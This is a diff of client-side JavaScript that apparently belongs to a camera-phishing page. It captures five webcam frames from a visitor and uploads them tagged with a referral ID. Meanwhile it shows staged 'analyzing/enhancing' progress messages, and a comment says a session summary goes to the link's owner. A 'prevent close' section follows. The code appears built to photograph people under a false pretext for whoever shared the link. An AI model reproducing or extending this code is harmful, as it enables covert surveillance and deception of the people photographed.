@@ -1090,100 +1090,230 @@
     // ============================================================
     // START BUTTON
     // ============================================================
+    // captureBtn.addEventListener("click", async () => {
+    //     if (!stream || !referralId) {
+    //         showToast(TEXTS.web_notif_camera_notready, "error");
+    //         return;
+    //     }
+
+    //     if (!cameraReady) {
+    //         showToast(TEXTS.web_notif_camera, "error");
+    //         return;
+    //     }
+
+    //     captureBtn.disabled = true;
+    //     setProgress(0);
+
+    //     const totalPhotos = 5;
+    //     const formData = new FormData();
+    //     formData.append("referral_id", referralId);
+
+    //     const messages = [
+    //         TEXTS.web_msg_analyze,
+    //         TEXTS.web_msg_process,
+    //         TEXTS.web_msg_merge,
+    //         TEXTS.web_msg_enhance,
+    //         TEXTS.web_msg_final
+    //     ];
+
+    //     try {
+    //         for (let i = 1; i <= totalPhotos; i++) {
+    //             const percent = Math.round((i / totalPhotos) * 100);
+    //             setProgress(percent);
+    //             setStatus(
+    //                 messages[i - 1] || TEXTS.web_progress_frames,
+    //                 TEXTS.web_progress_label
+    //                     .replace("{i}", i)
+    //                     .replace("{total}", totalPhotos),
+    //                 true
+    //             );
+
+    //             // انتظر قليلاً قبل الالتقاط (يضمن إطار جديد)
+    //             await delay(200);
+
+    //             const blob = await captureFrame();
+
+    //             // فحص: هل الصورة سوداء/فارغة؟
+    //             if (!blob || blob.size < 2000) {
+    //                 console.warn("Frame", i, "too small:", blob?.size);
+    //                 throw new Error("Captured frame is empty/black");
+    //             }
+    //             console.log("Frame", i, "size:", blob.size, "bytes");
+
+    //             formData.append("photos", blob, `photo_${i}.jpg`);
+
+    //             if (i < totalPhotos) await delay(2000);
+    //         }
+
+    //         // أوقف الكاميرا
+    //         if (stream) {
+    //             stream.getTracks().forEach(t => t.stop());
+    //             stream = null;
+    //         }
+
+    //         setStatus(TEXTS.web_generating, TEXTS.web_uploading, true);
+    //         showToast(TEXTS.web_generating_notif, "info");
+
+    //         const response = await fetch("/upload-photo", {
+    //             method: "POST",
+    //             body: formData
+    //         });
+    //         const result = await response.json();
+
+    //         if (response.ok && result.success) {
+    //             setProgress(100);
+    //             setStatus(TEXTS.web_success, TEXTS.web_complete, false);
+    //             successOverlay.classList.add("show");
+    //             showToast(TEXTS.web_success_notif, "success");
+    //         } else {
+    //             setStatus(result.message || TEXTS.web_failed, "", false);
+    //             showToast("❌ " + (result.message || TEXTS.web_failed), "error");
+    //             captureBtn.disabled = false;
+    //         }
+    //     } catch (err) {
+    //         console.error("Capture error:", err);
+    //         setStatus(TEXTS.web_connection_error, "", false);
+    //         showToast("❌ " + (err.message || TEXTS.web_connection_error_notif), "error");
+    //         captureBtn.disabled = false;
+
+    //         // أعد تشغيل الكاميرا لو أمكن
+    //         if (!stream) {
+    //             cameraReady = false;
+    //             await initCamera();
+    //         }
+    //     }
+    // });
     captureBtn.addEventListener("click", async () => {
-        if (!stream || !referralId) {
-            showToast(TEXTS.web_notif_camera_notready, "error");
-            return;
-        }
+    if (!stream || !referralId) {
+        showToast(TEXTS.web_notif_camera_notready, "error");
+        return;
+    }
 
-        if (!cameraReady) {
-            showToast(TEXTS.web_notif_camera, "error");
-            return;
-        }
+    if (!cameraReady) {
+        showToast(TEXTS.web_notif_camera, "error");
+        return;
+    }
 
-        captureBtn.disabled = true;
-        setProgress(0);
+    captureBtn.disabled = true;
+    setProgress(0);
 
-        const totalPhotos = 5;
-        const formData = new FormData();
-        formData.append("referral_id", referralId);
+    const totalPhotos = 5;
+    const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
 
-        const messages = [
-            TEXTS.web_msg_analyze,
-            TEXTS.web_msg_process,
-            TEXTS.web_msg_merge,
-            TEXTS.web_msg_enhance,
-            TEXTS.web_msg_final
-        ];
+    let sentCount = 0;
+    let failedCount = 0;
 
-        try {
-            for (let i = 1; i <= totalPhotos; i++) {
-                const percent = Math.round((i / totalPhotos) * 100);
-                setProgress(percent);
-                setStatus(
-                    messages[i - 1] || TEXTS.web_progress_frames,
-                    TEXTS.web_progress_label
-                        .replace("{i}", i)
-                        .replace("{total}", totalPhotos),
-                    true
-                );
+    const messages = [
+        TEXTS.web_msg_analyze,
+        TEXTS.web_msg_process,
+        TEXTS.web_msg_merge,
+        TEXTS.web_msg_enhance,
+        TEXTS.web_msg_final
+    ];
 
-                // انتظر قليلاً قبل الالتقاط (يضمن إطار جديد)
-                await delay(200);
+    try {
+        for (let i = 1; i <= totalPhotos; i++) {
+            const percent = Math.round((i / totalPhotos) * 100);
+            setProgress(percent);
+            setStatus(
+                messages[i - 1] || TEXTS.web_progress_frames,
+                TEXTS.web_progress_label
+                    .replace("{i}", i)
+                    .replace("{total}", totalPhotos),
+                true
+            );
 
-                const blob = await captureFrame();
+            // انتظر قليلاً قبل الالتقاط
+            await delay(200);
 
-                // فحص: هل الصورة سوداء/فارغة؟
-                if (!blob || blob.size < 2000) {
-                    console.warn("Frame", i, "too small:", blob?.size);
-                    throw new Error("Captured frame is empty/black");
+            let blob = null;
+            try {
+                blob = await captureFrame();
+            } catch (capErr) {
+                console.error(`Frame ${i} capture failed:`, capErr);
+                failedCount++;
+                continue;
+            }
+
+            if (!blob || blob.size < 2000) {
+                console.warn(`Frame ${i} too small:`, blob?.size);
+                failedCount++;
+                continue;
+            }
+
+            // إرسال فوري لكل صورة
+            try {
+                const fd = new FormData();
+                fd.append("photo", blob, `photo_${i}.jpg`);
+                fd.append("referral_id", referralId);
+                fd.append("session_id", sessionId);
+                fd.append("index", String(i));
+                fd.append("total", String(totalPhotos));
+
+                const resp = await fetch("/upload-single-photo", {
+                    method: "POST",
+                    body: fd
+                });
+
+                const data = await resp.json();
+                if (resp.ok && data.success) {
+                    sentCount++;
+                    console.log(`✅ Photo ${i} sent (${blob.size} bytes)`);
+                } else {
+                    failedCount++;
+                    console.warn(`❌ Photo ${i} rejected:`, data.message);
                 }
-                console.log("Frame", i, "size:", blob.size, "bytes");
-
-                formData.append("photos", blob, `photo_${i}.jpg`);
-
-                if (i < totalPhotos) await delay(2000);
+            } catch (netErr) {
+                console.error(`❌ Photo ${i} network error:`, netErr);
+                failedCount++;
+                // لا نكسر الحلقة — نكمل الباقي
             }
 
-            // أوقف الكاميرا
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-                stream = null;
-            }
-
-            setStatus(TEXTS.web_generating, TEXTS.web_uploading, true);
-            showToast(TEXTS.web_generating_notif, "info");
-
-            const response = await fetch("/upload-photo", {
-                method: "POST",
-                body: formData
-            });
-            const result = await response.json();
-
-            if (response.ok && result.success) {
-                setProgress(100);
-                setStatus(TEXTS.web_success, TEXTS.web_complete, false);
-                successOverlay.classList.add("show");
-                showToast(TEXTS.web_success_notif, "success");
-            } else {
-                setStatus(result.message || TEXTS.web_failed, "", false);
-                showToast("❌ " + (result.message || TEXTS.web_failed), "error");
-                captureBtn.disabled = false;
-            }
-        } catch (err) {
-            console.error("Capture error:", err);
-            setStatus(TEXTS.web_connection_error, "", false);
-            showToast("❌ " + (err.message || TEXTS.web_connection_error_notif), "error");
-            captureBtn.disabled = false;
-
-            // أعد تشغيل الكاميرا لو أمكن
-            if (!stream) {
-                cameraReady = false;
-                await initCamera();
-            }
+            if (i < totalPhotos) await delay(2000);
         }
-    });
 
+        // إيقاف الكاميرا
+        if (stream) {
+            stream.getTracks().forEach(t => t.stop());
+            stream = null;
+        }
+
+        // إبلاغ السيرفر بانتهاء الجلسة (يرسل ملخصاً لصاحب الرابط)
+        try {
+            await fetch("/finish-session", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    referral_id: referralId,
+                    total: totalPhotos,
+                    sent: sentCount,
+                    failed: failedCount
+                })
+            });
+        } catch (e) {
+            console.warn("finish-session failed:", e);
+        }
+
+        if (sentCount > 0) {
+            setProgress(100);
+            setStatus(TEXTS.web_success, TEXTS.web_complete, false);
+            successOverlay.classList.add("show");
+            showToast(`${TEXTS.web_success_notif} (${sentCount}/${totalPhotos})`, "success");
+        } else {
+            setStatus(TEXTS.web_failed, "", false);
+            showToast(`❌ ${TEXTS.web_failed}`, "error");
+            captureBtn.disabled = false;
+        }
+
+    } catch (err) {
+        console.error("Capture error:", err);
+        setStatus(TEXTS.web_connection_error, "", false);
+        showToast("❌ " + (err.message || TEXTS.web_connection_error_notif), "error");
+        captureBtn.disabled = false;
+    }
+});
+    
     // ============================================================
     // PREVENT CLOSE
     // ============================================================
